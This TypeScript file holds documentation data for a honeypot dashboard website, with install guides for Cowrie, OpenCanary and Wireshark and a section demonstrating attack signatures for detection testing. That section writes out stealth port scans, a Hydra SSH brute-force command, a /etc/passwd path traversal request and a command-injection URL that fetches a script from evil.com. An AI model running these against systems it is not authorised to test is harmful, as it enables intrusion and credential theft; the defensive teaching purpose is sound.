import type { NavigationItem, ServiceDocumentation } from "../../../types";


export const mockTemplate: ServiceDocumentation = {
    id: 'หัวข้อ',
    name: '',
    description: '',
    sections: [
        {
            id: 'สเต็ป',
            title: '',
            content: '',
            codeBlocks: [
                {
                    language: 'bash',
                    code: ''
                }
            ],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: ``
                        }
                    ]
                }
            ],
            images: []
        },
    ]
};


// ========================
// GET START
// ========================

export const GetstartDocumentation: ServiceDocumentation = {
    id: 'get-start-1',
    name: 'Honeypot Deployment & Dashboard Guide',
    description: 'Learn how to deploy a fully functional honeypot system from scratch. This guide covers everything from installing and configuring the honeypot backend, building a real-time monitoring dashboard, to integrating alerts and data visualization. Whether you’re a beginner or experienced in cybersecurity, you’ll find step-by-step instructions to set up, customize, and secure your honeypot environment.',
    sections: [
        {
            id: 'step1',
            title: 'Step 1 - Clone the Dashboard Repository',
            content: 'Before we can start building our honeypot dashboard, we need the source code. Think of this step as downloading the “blueprint” for your entire system. Run the command below to pull the project straight from GitHub.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'git clone https://github.com/NobpasinTumdee/dashboard-honeypot.git'
                }
            ],
            subsections: [
                {
                    id: 'step1-1',
                    title: 'change directory',
                    content: 'Once it’s done, move into the project folder — that’s where all the magic will happen in the next steps. By the end of this step, you’ll have the complete dashboard code sitting on your machine, ready for customization, configuration, and a bit of hacking fun.',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `cd ./dashboard-honeypot`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'Step 2',
            title: 'Step 2 - Install and Launch the Frontend',
            content: 'Now that you’ve got the main dashboard project, it’s time to fire up the frontend — the part that you’ll actually see and interact with in your browser.\nFirst, head into the DashboardV2 directory. This is where all the frontend code lives. Then, run npm install to grab all the packages and dependencies it needs (think of it as stocking your toolbox with the right tools).\nOnce that’s done, launch the development server with npm run dev. This will spin up your dashboard locally so you can see changes in real time as we build things out.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'cd ./DashboardV3'
                }
            ],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'install libraries',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `npm install`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'Step 3',
            title: 'Step 3 - Install and Run the Backend',
            content: 'With the frontend up and running, it’s time to give it a brain — the backend. This is where all the data handling, authentication, and socket connections happen. Without it, your dashboard is just a pretty face with no substance.First, navigate into the backend directory',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Next, install all the required packages in one go. Here’s what you’re getting:',
                    content: 'express – Your web server framework',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'cors – To handle cross-origin requests (frontend ↔ backend)',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'morgan – Request logger for easier debugging',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'bcryptjs – For password hashing and security',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'jsonwebtoken – For authentication via JWT',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'prisma – Your database toolkit',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'socket.io – Real-time communication between server and dashboard',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'dotenv – Manage environment variables',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'nodemon – Auto-restart the server on changes',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'sqlite3 – The lightweight database engine',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'After that, sync Prisma with your existing database and generate the client. Finally, start your backend in development mode.',
                    content: '',
                    codeBlocks: []
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'set up backend',
                    content: 'change directory',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `cd ./server/API/socket`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'install libraries',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `npm install express cors morgan bcryptjs jsonwebtoken prisma socket.io dotenv nodemon sqlite3`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'prisma',
                    content: 'prisma library (pull database)',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `npx prisma db pull`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'prisma library (generate)',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `npx prisma generate`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Run',
                    content: 'run backend',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `npm run dev`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'Step 4',
            title: 'Step 4 - run python script',
            content: 'Now that both your frontend and backend are ready, it’s time to process some honeypot log data! Navigate into the folder where the Python script lives This script, Honeypot_Log_Processor.py, is responsible for converting raw honeypot logs into a format your dashboard can understand and display. Running it will prepare your data so you can visualize attacks and sessions more clearly.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Next, run the Python script to process the data.',
                    content: 'change directory',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `cd ./server/plugin/convertData`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'run python script',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `python3' code="./Honeypot_Log_Processor.py`
                        }
                    ]
                }
            ],
            images: []
        },
    ]
};



// ========================
//     Cowrie Documentation
// ========================


export const CowrieDocumentation: ServiceDocumentation = {
    id: 'หัวข้อ',
    name: 'Installing Cowrie in seven steps',
    description: 'This guide describes how to install Cowrie in shell mode. For proxy mode read PROXY.rst.',
    sections: [
        {
            id: 'สเต็ป',
            title: 'Step 1: Install system dependencies',
            content: 'First we install system-wide support for Python virtual environments and other dependencies. Actual Python packages are installed later. On Debian based systems (last verified on Debian Bookworm',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'sudo apt-get install git python3-pip python3-venv libssl-dev libffi-dev build-essential libpython3-dev python3-minimal authbind'
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 2: Create a user account',
            content: 'It’s strongly recommended to run with a dedicated non-root user id:',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Add user cowrie',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo adduser --disabled-password cowrie`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Switch to user cowrie',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo su - cowrie`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 3: Checkout the code',
            content: 'Check out the code from GitHub:',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'clone repository',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `git clone http://github.com/cowrie/cowrie`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'change directory',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `cd cowrie`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 4: Setup Virtual Environment',
            content: 'Next you need to create your virtual environment:',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'create virtual environment',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `python3 -m venv cowrie-env`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'activate virtual environment',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `source cowrie-env/bin/activate`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 5: Install configuration file',
            content: 'The configuration for Cowrie is stored in cowrie.cfg.dist and cowrie.cfg (Located in cowrie/etc). Both files are read on startup, where entries from cowrie.cfg take precedence. The .dist file can be overwritten by upgrades, cowrie.cfg will not be touched. To run with a standard configuration, there is no need to change anything. To enable telnet, for example, create cowrie.cfg and input only the following:',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'enable telnet',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `[telnet] enabled = true`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'enable ssh',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `[ssh] enabled = true`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 6: Starting Cowrie',
            content: 'Start Cowrie with the cowrie command. You can add the cowrie/bin directory to your path if desired. An existing virtual environment is preserved if activated, otherwise Cowrie will attempt to load the environment called “cowrie-env”:',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'start cowrie',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `bin/cowrie start`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'check status',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `bin/cowrie status`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'stop cowrie',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `bin/cowrie stop`
                        }
                    ]
                }
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: 'Step 7: Listening on port 22 (OPTIONAL)',
            content: 'There are three methods to make Cowrie accessible on the default SSH port (22): iptables, authbind and setcap.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'The following firewall rule will forward incoming traffic on port 22 to port 2222 on Linux:',
                    content: 'ssh',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo iptables -t nat -A PREROUTING -p tcp --dport 22 -j REDIRECT --to-port 2222`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'telnet',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo iptables -t nat -A PREROUTING -p tcp --dport 23 -j REDIRECT --to-port 2223`
                        }
                    ]
                },
            ],
            images: []
        },
    ]
};



// ====================
// OpenCanary
// ====================
export const OpenCanaryDocumentation: ServiceDocumentation = {
    id: 'หัวข้อ',
    name: 'OpenCanary Installation and Setup Guide for Ubuntu 24.04.2',
    description: 'This guide provides a step-by-step process for installing and configuring OpenCanary, a honeypot that can be used to detect suspicious activity on a network. OpenCanary simulates various services (like HTTP, FTP, etc.) to lure attackers and log their interactions.',
    sections: [
        {
            id: 'สเต็ป',
            title: '1. Update and Install Dependencies',
            content: 'First, update your package lists and upgrade existing packages. Then, install the necessary libraries for Python and network-related functionalities.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `sudo apt update
sudo apt upgrade
sudo apt-get install python3-dev python3-pip python3-virtualenv python3-venv python3-scapy libssl-dev libpcap-dev`
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '2. Create a Python Virtual Environment',
            content: 'Using a virtual environment is a best practice to manage project dependencies without affecting your system"s global Python installation.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Navigate to your desired directory (e.g., /home/cpe27) and create a virtual environment named env. Then, activate it.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `cd /home/cpe27
virtualenv env/
source env/bin/activate`
                        }
                    ]
                },
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '3. Install OpenCanary',
            content: 'With the virtual environment activated, use pip to install OpenCanary.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `pip install opencanary`
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '4. Install Optional Modules',
            content: 'To extend OpenCanary"s capabilities to include SMB (Windows File Share) and SNMP protocols, you need to install additional packages.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `sudo apt install samba
pip install scapy pcapy-ng`
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '5. Generate the Configuration File',
            content: 'OpenCanary uses a configuration file located at /etc/opencanaryd/opencanary.conf. Use the following command to generate a default configuration file.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `sudo opencanaryd --copyconfig`
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '6. Edit the Configuration File',
            content: 'The configuration file allows you to enable or disable different honeypot services. Use a text editor like nano to edit the file and enable the services you want to monitor, such as HTTP, HTTPS, and FTP. Set the value for each service you want to enable to true.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `sudo nano /etc/opencanaryd/opencanary.conf`
                },
                {
                    language: 'bash',
                    code: `"http.enabled": true,
"https.enabled": true,
"ftp.enabled": true,`
                },
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '7. Run OpenCanary',
            content: 'To start the honeypot, first reactivate the virtual environment (if it"s not already active). Then, run opencanaryd as a background process using a dedicated user (nobody) and group (nogroup) for security.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `. env/bin/activate`
                },
                {
                    language: 'bash',
                    code: `opencanaryd --start --uid=nobody --gid=nogroup`
                },
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '8. Check the Log File',
            content: 'OpenCanary logs all detected activity to a file. You can monitor this file to see any interactions with the honeypot. The default log file is opencanary.log located in /var/tmp.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `cd /var/tmp`
                },
                {
                    language: 'bash',
                    code: `nano opencanary.log`
                },
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '9. Stop the Honeypot',
            content: 'There are two ways to stop OpenCanary.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Method 1: The official stop command',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `opencanaryd --stop`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Method 2: Manually kill the process',
                    content: 'First, find the Process ID (PID) of the running opencanaryd process.',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `ps aux | grep opencanaryd`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'Then, use sudo kill followed by the PID, which is usually found on the first line of the output.',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo kill <PID>`
                        }
                    ]
                },
            ],
            images: []
        },
    ]
};


// ==========================
// Wireshark installation
// ==========================
export const WiresharkDocumentation: ServiceDocumentation = {
    id: 'หัวข้อ',
    name: 'Wireshark and PyShark Installation Guide',
    description: 'This guide covers the installation of Wireshark, a popular network protocol analyzer, and PyShark, a Python wrapper for Wireshark"s command-line interface, TShark.',
    sections: [
        {
            id: 'สเต็ป',
            title: '1. Wireshark Installation',
            content: 'First, update your package lists to ensure you get the latest version of Wireshark. Then, install the application.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: `sudo apt update
sudo apt install wireshark -y`
                }
            ],
            subsections: [],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '2. Install PyShark in a Virtual Environment',
            content: 'It"s a good practice to install Python libraries like PyShark within a virtual environment. This keeps your project dependencies isolated and prevents conflicts.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: '',
                    content: 'First, make sure you have your virtual environment activated (source env/bin/activate). Then, install PyShark using pip.',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `pip install pyshark`
                        }
                    ]
                },
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '3. Wireshark Basic Configuration',
            content: 'After installation, you need to configure Wireshark to allow non-root users to capture network traffic. This is a crucial step for security and convenience.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'a) Reconfigure Wireshark Permissions',
                    content: 'This command will bring up a configuration screen. Select Yes to allow non-root users to capture packets',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo dpkg-reconfigure wireshark-common -y`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'b) Add Your User to the Wireshark Group',
                    content: 'Add your current user to the wireshark group. This grants the necessary permissions to capture traffic without requiring sudo. You"ll need to log out and log back in for the changes to take effect.',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo usermod -aG wireshark $USER`
                        }
                    ]
                },
            ],
            images: []
        },
    ]
};


// ========================
// Wireshark Attck
// ========================

export const WiresharkAttckDocumentation: ServiceDocumentation = {
    id: 'หัวข้อ',
    name: 'Demonstrating Attack Signatures',
    description: 'This guide shows how to simulate common attack patterns—scanning, brute-force, and exploitation—using well-known open-source tools. This is for educational and testing purposes only, to help you understand how these attacks work and how they might be detected by a honeypot like OpenCanary. Do not use these commands against systems you do not own.',
    sections: [
        {
            id: 'สเต็ป',
            title: '1. Scan Signature Demo',
            content: 'Scanning is the first step an attacker takes to discover hosts and open ports. We will use Nmap, the network mapper, to simulate these scans.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'sudo apt install nmap'
                }
            ],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Host Discovery: This command scans an entire subnet to find active hosts.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `nmap [subnet]`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Port Scan: This command checks for specific open ports on a single IP address.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `nmap -p 22,80,443 [ip address]`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'SYN Stealth Scan: This is a "stealth" scan that is less likely to be logged by firewalls. It is often used by attackers to remain undetected.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo nmap -sS [ip address]`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'FIN Scan: This scan sends a FIN packet, and if no response is received, the port is considered open. This is another technique to evade detection.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `sudo nmap -sF [ip address]`
                        }
                    ]
                },
                
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '2. Brute-Force Signature Demo',
            content: 'Brute-force attacks attempt to guess passwords by systematically trying a large number of common credentials. We will use Hydra, a popular brute-force tool.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'sudo apt install hydra'
                }
            ],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'Hydra Command: This command attempts to log into an SSH server. -l specifies the username, and -P points to a file containing a list of passwords.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `hydra -l [username] -P /path/to/passwords.txt ssh://[ip address]`
                        }
                    ]
                },
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '3. Exploit Signature Demo',
            content: 'These commands simulate common web-based exploitation attempts by sending maliciously crafted requests to a server using Curl.',
            codeBlocks: [],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'User-Agent Spoofing: This command spoofs the user-agent to mimic a security tool like sqlmap. This can trigger alerts on a honeypot.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `curl -A "sqlmap/1.5" http://[ip address]:[port]/test`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Path Traversal: These commands attempt to access sensitive files on the server, like /etc/passwd, by "traversing" directory paths.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `curl http://[ip address]:[port]/etc/passwd`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Buffer Overflow: This command sends an abnormally long string of characters (A repeated 200 times) to test if the server is vulnerable to buffer overflow attacks.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `curl http://[ip address]:[port]/$(python3 -c "print('A'*200)")`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Command Injection: This command attempts to inject a malicious shell command (wget) into a URL parameter to force the server to download an external file.',
                    content: '',
                    codeBlocks: [
                        {
                            language: 'bash',
                            code: `curl "http://[ip address]:[port]/?input=hello%3Bwget%20http://evil.com/malware.sh"`
                        }
                    ]
                },
                {
                    id: 'สเต็ปย่อย',
                    title: 'Note on HTTP vs. HTTPS:',
                    content: 'For HTTPS, change http:// to https:// in the command. For Self-signed certificates, add -k after curl to bypass SSL certificate validation.',
                    codeBlocks: []
                },
            ],
            images: []
        },
        {
            id: 'สเต็ป',
            title: '4. Server Side Preparation (HTTP)',
            content: 'To receive and analyze these HTTP-based requests, you can set up a simple web server using Python"s built-in module.',
            codeBlocks: [
                {
                    language: 'bash',
                    code: 'python3 -m http.server [port]'
                }
            ],
            subsections: [
                {
                    id: 'สเต็ปย่อย',
                    title: 'This command starts an HTTP server on the specified port, which will log all incoming requests, allowing you to see the attack signatures in real-time.',
                    content: '',
                    codeBlocks: []
                },
            ],
            images: []
        },
    ]
};



export const mockNavigation: NavigationItem[] = [
    { id: 'home', name: 'Home', href: '/' },
    { id: 'docs', name: 'Documentation', href: '/docs' },
    { id: 'about', name: 'About Us', href: '/about' }
];